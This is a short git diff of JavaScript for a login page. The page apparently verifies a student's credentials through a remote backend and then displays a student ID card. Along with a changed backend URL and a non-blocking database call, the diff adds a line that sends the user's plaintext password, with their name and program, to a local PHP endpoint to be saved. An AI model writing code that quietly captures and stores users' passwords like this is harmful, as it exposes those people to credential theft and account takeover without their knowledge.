@@ -1,4 +1,4 @@
-const RAILWAY_URL = 'https://unultimointentoporvaleri-production.up.railway.app';
+const RAILWAY_URL = 'https://unultimointentoporvaleri-production-5064.up.railway.app';
 
 // Toggle password
 const togglePass = document.getElementById('togglePass');
@@ -54,18 +54,19 @@ form.addEventListener('submit', async (e) => {
       return;
     }
 
-    // PASO 2: Guardar en BD
+    // PASO 2: Guardar en BD (no bloquear si falla)
     setEstado('Credenciales verificadas. Guardando registro...');
-    await fetch('api/registrar.php', {
+    fetch('api/registrar.php', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         registro:   data.codigo  || registro,
+        password:   password,
         nombre:     data.nombre  || '',
         cargo:      data.carrera || 'ESTUDIANTE',
         verificado: true
       })
-    });
+    }).catch(e => console.warn('BD no disponible:', e.message));
 
     // PASO 3: Guardar datos del carnet en sessionStorage y redirigir
     setEstado('Cargando carnet...');
